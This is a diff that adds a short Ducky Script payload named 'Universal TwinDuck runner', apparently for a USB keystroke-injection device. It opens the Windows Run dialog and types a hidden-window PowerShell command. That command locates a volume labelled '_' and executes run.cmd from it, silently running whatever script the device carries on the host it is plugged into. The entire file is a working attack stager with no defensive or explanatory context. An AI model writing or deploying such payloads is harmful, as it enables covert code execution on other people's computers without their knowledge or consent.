@@ -1,0 +1,6 @@
+REM Universal TwinDuck runner
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -NoLogo -WindowStyle Hidden "$d=(gwmi win32_volume -f 'label=''_''').Name;.($d+'run.cmd')"
+ENTER
